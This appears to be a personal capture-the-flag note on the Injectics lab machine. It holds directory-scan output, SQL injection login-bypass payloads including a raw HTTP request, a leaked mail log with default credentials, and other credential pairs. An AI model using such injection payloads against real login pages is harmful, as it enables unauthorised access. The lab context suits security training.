---
tags:
  - web
  - SQLi
  - Revisit
---

> [!Attention] New thing
> This SQLi payload worked: `'+or+'x'='x'--+-` but this one didn't `'+or+'1'='1'--+-`.

web enumeration 
```sh
[18:36:26] 301 -  309B  - /js  ->  http://10.10.191.55/js/
[18:36:45] 403 -  277B  - /.htaccess.bak1
[18:36:45] 403 -  277B  - /.htaccess.orig
[18:36:45] 403 -  277B  - /.htaccess.sample
[18:36:45] 403 -  277B  - /.htaccess.save
[18:36:45] 403 -  277B  - /.htaccess_orig
[18:36:45] 403 -  277B  - /.htaccess_extra
[18:36:45] 403 -  277B  - /.htaccessOLD
[18:36:45] 403 -  277B  - /.htaccess_sc
[18:36:45] 403 -  277B  - /.htaccessBAK
[18:36:45] 403 -  277B  - /.htaccessOLD2
[18:36:45] 403 -  277B  - /.ht_wsr.txt
[18:36:45] 403 -  277B  - /.htm
[18:36:46] 403 -  277B  - /.html
[18:36:46] 403 -  277B  - /.htpasswd_test
[18:36:46] 403 -  277B  - /.htpasswds
[18:36:46] 403 -  277B  - /.httr-oauth
[18:36:55] 403 -  277B  - /.php
[18:38:48] 200 -   48B  - /composer.json
[18:38:48] 200 -    9KB - /composer.lock
[18:38:58] 301 -  310B  - /css  ->  http://10.10.191.55/css/
[18:39:02] 302 -    0B  - /dashboard.php  ->  dashboard.php
[18:39:24] 301 -  312B  - /flags  ->  http://10.10.191.55/flags/
[18:39:47] 301 -  317B  - /javascript  ->  http://10.10.191.55/javascript/
[18:39:49] 403 -  277B  - /js/
[18:39:59] 200 -    1KB - /login.php
[18:40:04] 302 -    0B  - /logout.php  ->  index.php
[18:40:04] 200 -    1KB - /mail.log
[18:40:34] 301 -  317B  - /phpmyadmin  ->  http://10.10.191.55/phpmyadmin/
[18:40:40] 200 -    3KB - /phpmyadmin/doc/html/index.html
[18:40:41] 200 -    3KB - /phpmyadmin/index.php
[18:40:41] 200 -    3KB - /phpmyadmin/
[18:41:04] 403 -  277B  - /server-status
[18:41:04] 403 -  277B  - /server-status/
[18:41:45] 403 -  277B  - /vendor/
[18:41:45] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[18:41:45] 200 -    0B  - /vendor/composer/autoload_files.php
[18:41:45] 200 -    0B  - /vendor/composer/autoload_classmap.php
[18:41:45] 200 -    0B  - /vendor/composer/autoload_static.php
[18:41:45] 200 -    0B  - /vendor/composer/autoload_psr4.php
[18:41:45] 200 -    0B  - /vendor/autoload.php
[18:41:45] 200 -    0B  - /vendor/composer/autoload_real.php
[18:41:45] 200 -    1KB - /vendor/composer/LICENSE
[18:41:45] 200 -   12KB - /vendor/composer/installed.json
[18:41:46] 200 -    0B  - /vendor/composer/ClassLoader.php

```

This should be website pentest.

looking at the page tried some SQLi and it worked there is sqli but i don't know the actual user that i need to put as username
```http
POST /functions.php HTTP/1.1
Host: 10.10.191.55
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: keep-alive
Content-Length: 67

username=' 'x'='x'--+&password=slom&function=login
```

so looking at the source page of html we found URL to mail where we can find usernames and  passwords `mail.log`
```
Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm

```

putting it we can get cookie of this session.


---


Another good SQLi that need `Revisit` here.

`dev@injectics.thm : 2342sdsfwf2wr2rf`
`superadmin@injectics.thm : 34234vsdfwr2r2wf2r2`